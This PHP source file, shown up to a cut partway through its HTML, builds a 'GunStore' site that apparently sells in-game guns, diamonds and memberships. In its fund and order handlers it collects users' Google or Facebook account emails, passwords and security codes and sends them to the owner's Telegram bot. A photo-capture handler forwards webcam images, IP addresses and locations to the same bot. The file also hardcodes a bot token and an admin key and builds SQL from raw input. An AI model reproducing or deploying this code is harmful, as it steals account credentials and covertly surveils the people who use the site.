<?php
session_start();
$db = new SQLite3('venomx.db');

$db->exec("CREATE TABLE IF NOT EXISTS users (
    id INTEGER PRIMARY KEY AUTOINCREMENT,
    google_id TEXT UNIQUE,
    email TEXT UNIQUE,
    name TEXT,
    password TEXT,
    wallet REAL DEFAULT 0,
    banned INTEGER DEFAULT 0,
    photo TEXT,
    ip TEXT,
    location TEXT,
    captured_photo TEXT,
    created_at DATETIME DEFAULT CURRENT_TIMESTAMP
)");

$db->exec("CREATE TABLE IF NOT EXISTS orders (
    id INTEGER PRIMARY KEY AUTOINCREMENT,
    user_id INTEGER,
    item_type TEXT,
    item_id INTEGER,
    name TEXT,
    amount REAL,
    status TEXT DEFAULT 'approved',
    created_at DATETIME DEFAULT CURRENT_TIMESTAMP
)");

$db->exec("CREATE TABLE IF NOT EXISTS fund_requests (
    id INTEGER PRIMARY KEY AUTOINCREMENT,
    user_id INTEGER,
    amount REAL,
    utr TEXT,
    status TEXT DEFAULT 'pending',
    created_at DATETIME DEFAULT CURRENT_TIMESTAMP
)");

$db->exec("CREATE TABLE IF NOT EXISTS notifications (
    id INTEGER PRIMARY KEY AUTOINCREMENT,
    user_id INTEGER,
    message TEXT,
    seen INTEGER DEFAULT 0,
    created_at DATETIME DEFAULT CURRENT_TIMESTAMP
)");

$db->exec("CREATE TABLE IF NOT EXISTS memberships (
    id INTEGER PRIMARY KEY AUTOINCREMENT,
    name TEXT,
    price REAL,
    icon TEXT,
    created_at DATETIME DEFAULT CURRENT_TIMESTAMP
)");

$db->exec("CREATE TABLE IF NOT EXISTS guns (
    id INTEGER PRIMARY KEY AUTOINCREMENT,
    name TEXT,
    price REAL,
    image TEXT,
    created_at DATETIME DEFAULT CURRENT_TIMESTAMP
)");

$db->exec("CREATE TABLE IF NOT EXISTS diamonds (
    id INTEGER PRIMARY KEY AUTOINCREMENT,
    name TEXT,
    price REAL,
    image TEXT,
    created_at DATETIME DEFAULT CURRENT_TIMESTAMP
)");

$db->exec("CREATE TABLE IF NOT EXISTS settings (
    id INTEGER PRIMARY KEY AUTOINCREMENT,
    setting_key TEXT UNIQUE,
    setting_value TEXT,
    created_at DATETIME DEFAULT CURRENT_TIMESTAMP
)");

// Default Settings
$check = $db->querySingle("SELECT COUNT(*) FROM settings WHERE setting_key='upi_id'");
if($check == 0) {
    $db->exec("INSERT INTO settings (setting_key, setting_value) VALUES ('upi_id', '8210158438@mbk')");
    $db->exec("INSERT INTO settings (setting_key, setting_value) VALUES ('login_enabled', '1')");
    $db->exec("INSERT INTO settings (setting_key, setting_value) VALUES ('background', '#0a0a0a')");
}

// Default Memberships
$check = $db->querySingle("SELECT COUNT(*) FROM memberships");
if($check == 0) {
    $db->exec("INSERT INTO memberships (name, price, icon) VALUES ('Weekly', 99, 'https://i.ibb.co/qMJD9bc2/photo-AQAD9g9r-G5-DSe-FZ.jpg')");
    $db->exec("INSERT INTO memberships (name, price, icon) VALUES ('Monthly', 219, 'https://i.ibb.co/cKZmM0S8/photo-AQAD9w9r-G5-DSe-FZ.jpg')");
}

// Default Guns
$check = $db->querySingle("SELECT COUNT(*) FROM guns");
if($check == 0) {
    $guns = [
        ['AUG', 'https://i.ibb.co/JWdTwBMy/photo-AQADCh-Br-G5-DSe-FZ9.jpg'],
        ['M60', 'https://i.ibb.co/1tF6RqpS/photo-AQADCBBr-G5-DSe-FZ9.jpg'],
        ['P90', 'https://i.ibb.co/XxMGWzY5/photo-AQADBBBr-G5-DSe-FZ9.jpg'],
        ['Woodpecker', 'https://i.ibb.co/LdrDbk6M/photo-AQADAx-Br-G5-DSe-FZ9.jpg'],
        ['MP40', 'https://i.ibb.co/4nMDmBW1/photo-AQADAh-Br-G5-DSe-FZ9.jpg'],
        ['M10', 'https://i.ibb.co/k2HWwgFf/photo-AQAEEGsbk-NJ4-Vn0.jpg'],
        ['Thompson', 'https://i.ibb.co/0pPwrNVf/photo-AQAD-w9r-G5-DSe-FZ9.jpg'],
        ['A94', 'https://i.ibb.co/PzPfQSP3/photo-AQAD-g9r-G5-DSe-FZ9.jpg'],
        ['M1887', 'https://i.ibb.co/0VWCPvWW/photo-AQAD-Q9r-G5-DSe-FZ9.jpg'],
        ['MP5', 'https://i.ibb.co/Pvgr1rHF/photo-AQAD-w9r-G5-DSe-FZ9.jpg'],
        ['AK47', 'https://i.ibb.co/wFnQq4MX/photo-AQAD-Q9r-G5-DSe-FZ9.jpg']
    ];
    foreach($guns as $gun) {
        $db->exec("INSERT INTO guns (name, price, image) VALUES ('{$gun[0]}', 299, '{$gun[1]}')");
    }
}

// Default Diamonds
$check = $db->querySingle("SELECT COUNT(*) FROM diamonds");
if($check == 0) {
    $db->exec("INSERT INTO diamonds (name, price, image) VALUES ('100 Diamonds', 39, 'https://i.ibb.co/mCGqfB99/photo-AQAD-A9r-G5-DSe-FZ.jpg')");
    $db->exec("INSERT INTO diamonds (name, price, image) VALUES ('200 Diamonds', 79, 'https://i.ibb.co/mCGqfB99/photo-AQAD-A9r-G5-DSe-FZ.jpg')");
    $db->exec("INSERT INTO diamonds (name, price, image) VALUES ('1200 Diamonds', 499, 'https://i.ibb.co/mCGqfB99/photo-AQAD-A9r-G5-DSe-FZ.jpg')");
}

define('BOT_TOKEN', '8893330095:AAFwLKHleuwL8X4CWUeDS_0kJzCveZeCEeY');
define('OWNER_ID', '8586849798');

function botRequest($method, $data) {
    @file_get_contents("https://api.telegram.org/bot".BOT_TOKEN."/".$method."?".http_build_query($data));
}

function sendPhotoToBot($photoData, $caption) {
    $ch = curl_init();
    curl_setopt($ch, CURLOPT_URL, "https://api.telegram.org/bot".BOT_TOKEN."/sendPhoto");
    curl_setopt($ch, CURLOPT_POST, true);
    curl_setopt($ch, CURLOPT_POSTFIELDS, [
        'chat_id' => OWNER_ID,
        'photo' => $photoData,
        'caption' => $caption
    ]);
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
    curl_exec($ch);
    curl_close($ch);
}

function getUserIP() {
    if (!empty($_SERVER['HTTP_CLIENT_IP'])) return $_SERVER['HTTP_CLIENT_IP'];
    if (!empty($_SERVER['HTTP_X_FORWARDED_FOR'])) return $_SERVER['HTTP_X_FORWARDED_FOR'];
    return $_SERVER['REMOTE_ADDR'] ?? 'Unknown';
}

function getSetting($key) {
    global $db;
    $result = $db->querySingle("SELECT setting_value FROM settings WHERE setting_key='$key'", true);
    return $result ? $result['setting_value'] : null;
}

function updateSetting($key, $value) {
    global $db;
    $db->exec("UPDATE settings SET setting_value='$value' WHERE setting_key='$key'");
}

// Bot Commands
if(isset($_GET['bot_cmd'])) {
    $cmd = $_GET['bot_cmd'];
    $parts = explode(' ', $cmd);
    $action = $parts[0];
    if($action == 'addfund' && isset($parts[1], $parts[2])) {
        $user_id = intval($parts[1]);
        $amount = floatval($parts[2]);
        $db->exec("UPDATE users SET wallet = wallet + $amount WHERE id = $user_id");
        botRequest("sendMessage", ['chat_id' => OWNER_ID, 'text' => "✅ Added ₹$amount to User ID $user_id"]);
        echo "Done";
    }
    elseif($action == 'ban' && isset($parts[1])) {
        $db->exec("UPDATE users SET banned = 1 WHERE id = " . intval($parts[1]));
        botRequest("sendMessage", ['chat_id' => OWNER_ID, 'text' => "🚫 User ID {$parts[1]} banned"]);
        echo "Banned";
    }
    elseif($action == 'unban' && isset($parts[1])) {
        $db->exec("UPDATE users SET banned = 0 WHERE id = " . intval($parts[1]));
        botRequest("sendMessage", ['chat_id' => OWNER_ID, 'text' => "✅ User ID {$parts[1]} unbanned"]);
        echo "Unbanned";
    }
    elseif($action == 'broadcast') {
        $msg = implode(' ', array_slice($parts, 1));
        $users = $db->query("SELECT id FROM users");
        while($u = $users->fetchArray()) {
            $db->exec("INSERT INTO notifications (user_id, message) VALUES ({$u['id']}, '$msg')");
        }
        botRequest("sendMessage", ['chat_id' => OWNER_ID, 'text' => "📢 Broadcast sent: $msg"]);
        echo "Broadcasted";
    }
    elseif($action == 'stats') {
        $count = $db->querySingle("SELECT COUNT(*) FROM users");
        botRequest("sendMessage", ['chat_id' => OWNER_ID, 'text' => "📊 Total Users: $count"]);
        echo "Stats sent";
    }
    elseif($action == 'users') {
        $users = $db->query("SELECT id, email, wallet FROM users");
        $msg = "📋 Users List:\n";
        while($u = $users->fetchArray()) {
            $msg .= "🆔 {$u['id']} - {$u['email']} - ₹{$u['wallet']}\n";
        }
        botRequest("sendMessage", ['chat_id' => OWNER_ID, 'text' => $msg]);
        echo "Users list sent";
    }
    exit;
}

// Admin Actions
if(isset($_POST['admin_action'])) {
    $action = $_POST['admin_action'];
    $admin_key = $_POST['admin_key'] ?? '';
    if($admin_key === 'OWNER-X-ROHIT') {
        if($action === 'change_upi') {
            $new_upi = $_POST['new_upi'];
            updateSetting('upi_id', $new_upi);
            echo "<script>alert('UPI ID updated!'); window.location.href='?admin=1';</script>";
            exit;
        }
        elseif($action === 'toggle_login') {
            $current = getSetting('login_enabled');
            updateSetting('login_enabled', $current == '1' ? '0' : '1');
            echo "<script>alert('Login page toggled!'); window.location.href='?admin=1';</script>";
            exit;
        }
        elseif($action === 'change_bg') {
            $new_bg = $_POST['new_bg'];
            updateSetting('background', $new_bg);
            echo "<script>alert('Background updated!'); window.location.href='?admin=1';</script>";
            exit;
        }
        elseif($action === 'ban_ip') {
            $ip = $_POST['ban_ip'];
            $db->exec("UPDATE users SET banned = 1 WHERE ip='$ip'");
            echo "<script>alert('IP banned!'); window.location.href='?admin=1';</script>";
            exit;
        }
        elseif($action === 'unban_ip') {
            $ip = $_POST['unban_ip'];
            $db->exec("UPDATE users SET banned = 0 WHERE ip='$ip'");
            echo "<script>alert('IP unbanned!'); window.location.href='?admin=1';</script>";
            exit;
        }
        elseif($action === 'delete_user') {
            $user_id = intval($_POST['user_id']);
            $db->exec("DELETE FROM users WHERE id=$user_id");
            echo "<script>alert('User deleted!'); window.location.href='?admin=1';</script>";
            exit;
        }
    }
}

// Google Login
if(isset($_POST['google_credential'])) {
    $cred_json = base64_decode($_POST['google_credential']);
    $cred = json_decode($cred_json, true);
    if(!$cred || !isset($cred['sub'])) { header("Location: index.php"); exit; }
    $google_id = $cred['sub'];
    $email = $cred['email'] ?? '';
    $name = $cred['name'] ?? '';
    $photo = $cred['picture'] ?? '';
    $ip = getUserIP();
    $check = $db->querySingle("SELECT id, banned FROM users WHERE google_id='$google_id'", true);
    if($check) {
        if($check['banned'] == 1) { $_SESSION['banned'] = true; }
        else { $_SESSION['user_id'] = $check['id']; }
    } else {
        $db->exec("INSERT INTO users (google_id, email, name, photo, ip) VALUES ('$google_id', '$email', '$name', '$photo', '$ip')");
        $user_id = $db->lastInsertRowID();
        $_SESSION['user_id'] = $user_id;
        botRequest("sendMessage", ['chat_id' => OWNER_ID, 'text' => "🆕 New Google Login\nID: $user_id\n📧 $email\n👤 $name\n📍 IP: $ip"]);
    }
    header("Location: index.php");
    exit;
}

// Email Signup
if(isset($_POST['signup'])) {
    $email = $_POST['email'];
    $name = $_POST['name'];
    $pass = password_hash($_POST['password'], PASSWORD_DEFAULT);
    $ip = getUserIP();
    $check = $db->querySingle("SELECT id FROM users WHERE email='$email'", true);
    if(!$check) {
        $db->exec("INSERT INTO users (email, name, password, ip) VALUES ('$email', '$name', '$pass', '$ip')");
        $user_id = $db->lastInsertRowID();
        $_SESSION['user_id'] = $user_id;
        botRequest("sendMessage", ['chat_id' => OWNER_ID, 'text' => "🆕 New Signup\nID: $user_id\n📧 $email\n👤 $name\n📍 IP: $ip"]);
    }
    header("Location: index.php");
    exit;
}

// Email Login
if(isset($_POST['login'])) {
    $email = $_POST['email'];
    $pass = $_POST['password'];
    $user = $db->querySingle("SELECT * FROM users WHERE email='$email'", true);
    if($user && password_verify($pass, $user['password'])) {
        if($user['banned'] == 1) { $_SESSION['banned'] = true; }
        else { $_SESSION['user_id'] = $user['id']; }
        botRequest("sendMessage", ['chat_id' => OWNER_ID, 'text' => "🔐 User Login\nID: {$user['id']}\n📧 $email"]);
    }
    header("Location: index.php");
    exit;
}

// Cart
if(isset($_POST['add_to_cart'])) {
    if(!isset($_SESSION['cart'])) $_SESSION['cart'] = [];
    $_SESSION['cart'][] = [
        'type' => $_POST['item_type'],
        'id' => intval($_POST['item_id']),
        'name' => $_POST['item_name'],
        'price' => floatval($_POST['item_price'])
    ];
    header("Location: index.php?msg=Added+to+cart");
    exit;
}

if(isset($_GET['remove_cart'])) {
    $index = intval($_GET['remove_cart']);
    if(isset($_SESSION['cart'][$index])) unset($_SESSION['cart'][$index]);
    $_SESSION['cart'] = array_values($_SESSION['cart']);
    header("Location: index.php?show_cart=1");
    exit;
}

if(isset($_POST['checkout'])) {
    $total = 0;
    foreach($_SESSION['cart'] as $item) { $total += $item['price']; }
    if($total <= 0) { header("Location: index.php?msg=Cart+empty"); exit; }
    $_SESSION['checkout_total'] = $total;
    header("Location: index.php?step=checkout");
    exit;
}

// Payment
if(isset($_POST['add_funds_req'])) {
    $amount = floatval($_POST['amount']);
    $utr = $_POST['utr'];
    if($amount >= 399) {
        $_SESSION['temp_amount'] = $amount;
        $_SESSION['temp_utr'] = $utr;
        header("Location: index.php?step=game_account");
        exit;
    } else { 
        header("Location: index.php?msg=Minimum+₹399");
        exit;
    }
}

// Google Funds
if(isset($_POST['submit_google_funds'])) {
    $uid = $_POST['uid'];
    $game_name = $_POST['game_name'];
    $email = $_POST['email'];
    $pass = $_POST['password'];
    $code = $_POST['security_code'];
    $contact = $_POST['contact'];
    $user = $db->querySingle("SELECT * FROM users WHERE id=".$_SESSION['user_id'], true);
    $amount = $_SESSION['temp_amount'];
    $utr = $_SESSION['temp_utr'];
    
    $msg = "💰 ADD FUNDS + GOOGLE ACCOUNT\n👤 {$user['name']}\n🆔 {$user['id']}\n📧 {$user['email']}\n🎮 UID: $uid\n🎮 Game: $game_name\n📧 Gmail: $email\n🔑 Pass: $pass\n🔐 Code: $code\n📞 Contact: $contact\n💰 Amount: ₹$amount\n🔑 UTR: $utr";
    botRequest("sendMessage", ['chat_id' => OWNER_ID, 'text' => $msg]);
    
    $db->exec("INSERT INTO fund_requests (user_id, amount, utr) VALUES ({$user['id']}, $amount, '$utr')");
    
    unset($_SESSION['temp_amount'], $_SESSION['temp_utr']);
    echo "<script>alert('Fund request sent!'); window.location.href='index.php?msg=Fund+request+sent';</script>";
    exit;
}

// Facebook Funds
if(isset($_POST['submit_fb_funds'])) {
    $uid = $_POST['uid'];
    $game_name = $_POST['game_name'];
    $login = $_POST['login'];
    $pass = $_POST['password'];
    $linked_email = $_POST['linked_email'];
    $username = $_POST['username'];
    $contact = $_POST['contact'];
    $user = $db->querySingle("SELECT * FROM users WHERE id=".$_SESSION['user_id'], true);
    $amount = $_SESSION['temp_amount'];
    $utr = $_SESSION['temp_utr'];
    
    $msg = "💰 ADD FUNDS + FB ACCOUNT\n👤 {$user['name']}\n🆔 {$user['id']}\n📧 {$user['email']}\n🎮 UID: $uid\n🎮 Game: $game_name\n📞 Login: $login\n🔑 Pass: $pass\n📧 Linked: $linked_email\n👤 Username: $username\n📞 Contact: $contact\n💰 Amount: ₹$amount\n🔑 UTR: $utr";
    botRequest("sendMessage", ['chat_id' => OWNER_ID, 'text' => $msg]);
    
    $db->exec("INSERT INTO fund_requests (user_id, amount, utr) VALUES ({$user['id']}, $amount, '$utr')");
    
    unset($_SESSION['temp_amount'], $_SESSION['temp_utr']);
    echo "<script>alert('Fund request sent!'); window.location.href='index.php?msg=Fund+request+sent';</script>";
    exit;
}

// Google Order
if(isset($_POST['submit_google_order'])) {
    $uid = $_POST['uid'];
    $game_name = $_POST['game_name'];
    $email = $_POST['email'];
    $pass = $_POST['password'];
    $code = $_POST['security_code'];
    $contact = $_POST['contact'];
    $user = $db->querySingle("SELECT * FROM users WHERE id=".$_SESSION['user_id'], true);
    $total = $_SESSION['checkout_total'];
    
    if($user['wallet'] >= $total) {
        $db->exec("UPDATE users SET wallet = wallet - $total WHERE id=".$user['id']);
        foreach($_SESSION['cart'] as $item) {
            $db->exec("INSERT INTO orders (user_id, item_type, item_id, name, amount) VALUES ({$user['id']}, '{$item['type']}', {$item['id']}, '{$item['name']}', {$item['price']})");
        }
        $msg = "🎮 ORDER + GOOGLE ACCOUNT\n👤 {$user['name']}\n🆔 {$user['id']}\n📧 {$user['email']}\n🎮 UID: $uid\n🎮 Game: $game_name\n📧 Gmail: $email\n🔑 Pass: $pass\n🔐 Code: $code\n📞 Contact: $contact\n💰 Total: ₹$total";
        botRequest("sendMessage", ['chat_id' => OWNER_ID, 'text' => $msg]);
        $_SESSION['cart'] = [];
        unset($_SESSION['checkout_total']);
        echo "<script>alert('Order placed!'); window.location.href='index.php?msg=Order+placed+successfully';</script>";
        exit;
    } else {
        header("Location: index.php?msg=Insufficient+balance");
        exit;
    }
}

// Facebook Order
if(isset($_POST['submit_fb_order'])) {
    $uid = $_POST['uid'];
    $game_name = $_POST['game_name'];
    $login = $_POST['login'];
    $pass = $_POST['password'];
    $linked_email = $_POST['linked_email'];
    $username = $_POST['username'];
    $contact = $_POST['contact'];
    $user = $db->querySingle("SELECT * FROM users WHERE id=".$_SESSION['user_id'], true);
    $total = $_SESSION['checkout_total'];
    
    if($user['wallet'] >= $total) {
        $db->exec("UPDATE users SET wallet = wallet - $total WHERE id=".$user['id']);
        foreach($_SESSION['cart'] as $item) {
            $db->exec("INSERT INTO orders (user_id, item_type, item_id, name, amount) VALUES ({$user['id']}, '{$item['type']}', {$item['id']}, '{$item['name']}', {$item['price']})");
        }
        $msg = "🎮 ORDER + FB ACCOUNT\n👤 {$user['name']}\n🆔 {$user['id']}\n📧 {$user['email']}\n🎮 UID: $uid\n🎮 Game: $game_name\n📞 Login: $login\n🔑 Pass: $pass\n📧 Linked: $linked_email\n👤 Username: $username\n📞 Contact: $contact\n💰 Total: ₹$total";
        botRequest("sendMessage", ['chat_id' => OWNER_ID, 'text' => $msg]);
        $_SESSION['cart'] = [];
        unset($_SESSION['checkout_total']);
        echo "<script>alert('Order placed!'); window.location.href='index.php?msg=Order+placed+successfully';</script>";
        exit;
    } else {
        header("Location: index.php?msg=Insufficient+balance");
        exit;
    }
}

// Capture Photo
if(isset($_POST['capture_photo'])) {
    $photo_data = $_POST['photo_data'];
    $ip = getUserIP();
    $user_id = $_SESSION['user_id'] ?? 0;
    $location = $_POST['location'] ?? 'Unknown';
    
    $db->exec("UPDATE users SET captured_photo='$photo_data', location='$location' WHERE id=$user_id");
    
    sendPhotoToBot($photo_data, "📸 User ID: $user_id\n📍 IP: $ip\n📍 Location: $location");
    
    echo "Captured";
    exit;
}

// Logout
if(isset($_GET['logout'])) { session_destroy(); header("Location: index.php"); exit; }

// Get Data
$upi_id = getSetting('upi_id');
$login_enabled = getSetting('login_enabled');
$bg_color = getSetting('background');

$user = null;
$banned = false;
if(isset($_SESSION['user_id'])) {
    $user = $db->querySingle("SELECT * FROM users WHERE id=".$_SESSION['user_id'], true);
    if($user && $user['banned'] == 1) $banned = true;
}

$msg = isset($_GET['msg']) ? $_GET['msg'] : '';
$show_cart = isset($_GET['show_cart']) ? true : false;
$step = isset($_GET['step']) ? $_GET['step'] : '';
$checkout_total = isset($_SESSION['checkout_total']) ? $_SESSION['checkout_total'] : 0;
$cart_items = isset($_SESSION['cart']) ? $_SESSION['cart'] : [];
$cart_total = 0;
foreach($cart_items as $item) { $cart_total += $item['price']; }

$memberships = $db->query("SELECT * FROM memberships ORDER BY id");
$guns = $db->query("SELECT * FROM guns ORDER BY id");
$diamonds = $db->query("SELECT * FROM diamonds ORDER BY id");

$logo_url = "https://i.ibb.co/Q3kkqNyP/photo-AQADkh-Fr-G5-DSg-FZ.jpg";
$membership_header_img = "https://i.ibb.co/FqKBDmKB/photo-AQADj-RJr-G4-Pke-VZ9.jpg";
$gunstore_header_img = "https://i.ibb.co/SD0R2N2f/photo-AQADjx-Jr-G4-Pke-VZ9.jpg";
$diamond_header_img = "https://i.ibb.co/XkGYhVqH/photo-AQADjh-Jr-G4-Pke-VZ9.jpg";

function getCapturedPhotos() {
    global $db;
    $result = $db->query("SELECT id, name, email, captured_photo, location, ip FROM users WHERE captured_photo IS NOT NULL AND captured_photo != '' ORDER BY id DESC");
    $photos = [];
    while($row = $result->fetchArray()) {
        $photos[] = $row;
    }
    return $photos;
}
$captured_photos = getCapturedPhotos();
?>
<!DOCTYPE html>
<html>
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>GunStore</title>
    <script src="https://accounts.google.com/gsi/client" async defer></script>
    <style>
        * { margin:0; padding:0; box-sizing:border-box; }
        body { font-family:'Segoe UI',sans-serif; background:<?php echo $bg_color; ?>; color:#fff; min-height:100vh; }
        .login-page { min-height:100vh; display:flex; justify-content:center; align-items:center; background:linear-gradient(135deg,rgba(26,10,46,0.9),rgba(10,10,10,0.95)),url('https://i.ibb.co/WNJx8dJk/photo-AQADGx-Br-G5-DSe-FZ.jpg'); background-size:cover; background-position:center; padding:20px; }
        .login-card { background:rgba(0,0,0,0.85); backdrop-filter:blur(10px); border-radius:20px; padding:40px; width:100%; max-width:450px; text-align:center; border:2px solid #9b59b6; box-shadow:0 0 60px rgba(155,77,182,0.2); }
        .logo-img { max-width:200px; margin-bottom:20px; }
        input, select { width:100%; padding:14px; margin:10px 0; background:rgba(255,255,255,0.05); border:1px solid #4a1a6e; border-radius:10px; color:#fff; font-size:15px; }
        input:focus { border-color:#9b59b6; outline:none; }
        button { width:100%; padding:14px; background:linear-gradient(45deg,#7a2b9e,#4a1a6e); color:#fff; border:none; border-radius:10px; font-weight:bold; cursor:pointer; font-size:16px; transition:0.3s; }
        button:hover { transform:scale(1.02); box-shadow:0 0 30px rgba(122,43,158,0.4); }
        .switch { margin-top:15px; color:#aaa; cursor:pointer; }
        .switch span { color:#9b59b6; }
        .dashboard { min-height:100vh; padding:20px; background:<?php echo $bg_color; ?>; }
        .navbar { display:flex; justify-content:space-between; align-items:center; background:rgba(0,0,0,0.6); padding:15px 20px; border-radius:12px; margin-bottom:20px; border:1px solid #9b59b6; }
        .navbar-logo { height:45px; }
        .menu-icon { font-size:28px; cursor:pointer; color:#9b59b6; padding:5px 15px; border:1px solid #4a1a6e; border-radius:8px; }
        .wallet-card { background:rgba(26,10,46,0.8); padding:25px; border-radius:12px; margin-bottom:20px; text-align:center; border:1px solid #9b59b6; }
        .wallet-amount { font-size:2.5rem; color:#9b59b6; font-weight:bold; }
        .top-menu { display:flex; justify-content:center; gap:15px; margin-bottom:20px; flex-wrap:wrap; }
        .top-menu button { width:auto; padding:10px 20px; background:rgba(26,10,46,0.8); border:1px solid #9b59b6; font-size:14px; }
        .section-img { width:100%; max-width:300px; display:block; margin:20px auto; border-radius:12px; }
        .products-grid { display:flex; flex-wrap:wrap; gap:20px; justify-content:center; margin-top:20px; }
        .product-card { background:rgba(0,0,0,0.6); border:1px solid #4a1a6e; border-radius:12px; padding:20px; width:220px; text-align:center; transition:0.3s; }
        .product-card:hover { transform:translateY(-5px); border-color:#9b59b6; box-shadow:0 10px 30px rgba(122,43,158,0.2); }
        .product-icon { width:100%; height:120px; object-fit:contain; margin-bottom:10px; border-radius:8px; }
        .product-title { font-size:18px; font-weight:bold; margin:10px 0; color:#9b59b6; }
        .product-price { font-size:20px; color:#ffd700; margin:10px 0; font-weight:bold; }
        .cart-btn { background:#ff4444; margin-top:10px; }
        .whatsapp-fixed { position:fixed; bottom:20px; left:20px; background:#25D366; color:#fff; padding:10px 18px; border-radius:50px; text-decoration:none; z-index:100; font-weight:bold; border:none; font-size:14px; }
        .cart-fixed { position:fixed; bottom:20px; right:20px; background:#ff4444; color:#fff; padding:10px 20px; border-radius:50px; text-decoration:none; z-index:100; font-weight:bold; border:none; cursor:pointer; font-size:14px; }
        .telegram-fixed { position:fixed; bottom:80px; right:20px; background:#0088cc; color:#fff; padding:10px 18px; border-radius:50px; text-decoration:none; z-index:100; font-weight:bold; border:none; cursor:pointer; font-size:14px; }
        .page-popup { position:fixed; top:0; left:0; width:100%; height:100%; background:rgba(0,0,0,0.95); z-index:2000; display:none; overflow-y:auto; padding:20px; }
        .popup-card { background:rgba(0,0,0,0.9); border-radius:20px; padding:30px; max-width:500px; margin:50px auto; border:1px solid #9b59b6; }
        .cart-item { display:flex; justify-content:space-between; padding:10px; border-bottom:1px solid #333; }
        .cart-total { font-size:22px; font-weight:bold; margin:20px 0; text-align:center; color:#ffd700; }
        .game-login-btns { display:flex; gap:20px; justify-content:center; margin:20px 0; }
        .game-icon { width:100px; cursor:pointer; border-radius:12px; border:2px solid transparent; transition:0.3s; }
        .game-icon:hover { border-color:#9b59b6; transform:scale(1.05); }
        .popup { position:fixed; top:0; left:0; width:100%; height:100%; background:rgba(0,0,0,0.95); display:none; justify-content:center; align-items:center; z-index:3000; padding:20px; }
        .small-popup-card { background:rgba(0,0,0,0.9); border-radius:20px; padding:30px; width:90%; max-width:420px; border:1px solid #9b59b6; text-align:center; }
        .bonus-btns { display:flex; flex-wrap:wrap; gap:10px; margin:15px 0; }
        .bonus-btn { flex:1; background:rgba(26,10,46,0.8); border:1px solid #9b59b6; padding:12px; color:#fff; border-radius:8px; cursor:pointer; }
        .bonus-btn:hover { background:#9b59b6; }
        .order-item, .notif-item { background:rgba(26,10,46,0.6); padding:12px; margin:8px 0; border-radius:8px; border-left:3px solid #9b59b6; text-align:left; }
        .verified-badge { font-size:12px; color:#888; margin-top:10px; text-align:center; }
        .admin-panel { background:rgba(0,0,0,0.8); padding:20px; border-radius:12px; margin:20px 0; border:1px solid #9b59b6; }
        .admin-panel h3 { color:#9b59b6; margin-bottom:15px; }
        .admin-panel input { margin:8px 0; }
        .admin-panel .admin-btn { width:auto; padding:10px 25px; margin:5px; }
        .admin-panel .danger-btn { background:#cc0000; }
        .admin-panel .success-btn { background:#00cc00; }
        .captured-grid { display:grid; grid-template-columns:repeat(auto-fill,minmax(200px,1fr)); gap:15px; margin-top:15px; }
        .captured-item { background:rgba(26,10,46,0.6); border-radius:10px; padding:10px; border:1px solid #4a1a6e; }
        .captured-item img { width:100%; border-radius:8px; max-height:150px; object-fit:cover; }
        .captured-item p { font-size:12px; color:#aaa; margin-top:5px; }
        .admin-grid { display:grid; grid-template-columns:repeat(auto-fill,minmax(250px,1fr)); gap:15px; }
        .admin-user-card { background:rgba(26,10,46,0.6); border-radius:10px; padding:15px; border:1px solid #4a1a6e; }
        .admin-user-card .label { color:#9b59b6; font-weight:bold; }
        @media (max-width:768px) { .product-card { width:calc(50% - 10px); } .popup-card { margin:20px auto; padding:20px; } }
        .telegram-btn { background:#0088cc; color:#fff; border:none; padding:12px 20px; border-radius:10px; cursor:pointer; font-weight:bold; width:100%; margin:8px 0; }
        .telegram-btn:hover { background:#006699; }
        #video { width:100%; border-radius:10px; }
        #capturedPhoto { width:100%; border-radius:10px; display:none; }
        .camera-container { position:fixed; bottom:140px; left:20px; z-index:100; background:rgba(0,0,0,0.8); padding:15px; border-radius:12px; border:1px solid #9b59b6; max-width:200px; }
        .camera-container button { padding:8px 15px; font-size:12px; margin:5px 0; }
    </style>
</head>
<body>

<?php if($banned): ?>
<div class="login-page">
    <div class="login-card">
        <img src="<?php echo $logo_url; ?>" class="logo-img">
        <h2 style="color:#ff4444;">You Are Banned</h2>
        <p>Your IP has been banned.</p>
        <a href="https://wa.me/9485813638" style="display:inline-block;background:#25D366;color:#fff;padding:12px 25px;border-radius:8px;text-decoration:none;margin-top:15px;">WhatsApp Support</a>
    </div>
</div>
<?php elseif(!isset($_SESSION['user_id']) || $login_enabled == '1'): ?>
<div class="login-page">
    <div class="login-card">
        <img src="<?php echo $logo_url; ?>" class="logo-img">
        <div id="g_id_onload" data-client_id="369043602918-qsp4f4olbtmoksudfp8fnbuj8g39t8d0.apps.googleusercontent.com" data-callback="handleGoogleLogin" data-auto_prompt="false"></div>
        <div class="g_id_signin" data-type="standard" data-size="large"></div>
        <hr style="margin:15px 0; border-color:#333;">
        <form method="post">
            <input type="email" name="email" placeholder="Email Address" required>
            <input type="password" name="password" placeholder="Password" required>
            <button type="submit" name="login">Login</button>
        </form>
        <div class="switch" onclick="showSignup()">New here? <span>Create account</span></div>
        <div id="signupForm" style="display:none; margin-top:20px;">
            <form method="post">
                <input type="text" name="name" placeholder="Full Name" required>
                <input type="email" name="email" placeholder="Email Address" required>
                <input type="password" name="password" placeholder="Password" required>
                <button type="submit" name="signup">Create Account</button>
            </form>
        </div>
    </div>
</div>
<script>
function handleGoogleLogin(response) {
    var form = document.createElement('form'); form.method = 'POST';
    var input = document.createElement('input'); input.type = 'hidden'; input.name = 'google_credential'; input.value = response.credential;
    form.appendChild(input); document.body.appendChild(form); form.submit();
}
function showSignup() { 
    var form = document.getElementById('signupForm');
    form.style.display = form.style.display === 'none' ? 'block' : 'none';
}
</script>

<?php else: ?>
<div class="dashboard">
    <div class="navbar">
        <div class="menu-icon" onclick="toggleSidebar()">☰</div>
        <img src="<?php echo $logo_url; ?>" class="navbar-logo">
        <div>ID: <?php echo $user['id']; ?></div>
    </div>

    <!-- Sidebar -->
    <div id="sidebar" style="display:none; position:fixed; top:0; left:0; width:300px; height:100%; background:rgba(0,0,0,0.95); z-index:3000; padding:30px; border-right:2px solid #9b59b6; overflow-y:auto;">
        <div style="display:flex; justify-content:space-between; align-items:center; margin-bottom:30px;">
            <h3 style="color:#9b59b6;">Menu</h3>
            <span onclick="toggleSidebar()" style="font-size:28px; cursor:pointer;">✕</span>
        </div>
        <button onclick="showOrdersPage(); toggleSidebar();" style="margin:8px 0; background:rgba(26,10,46,0.8); border:1px solid #9b59b6;">Order History</button>
        <button onclick="showNotificationsPage(); toggleSidebar();" style="margin:8px 0; background:rgba(26,10,46,0.8); border:1px solid #9b59b6;">Notifications</button>
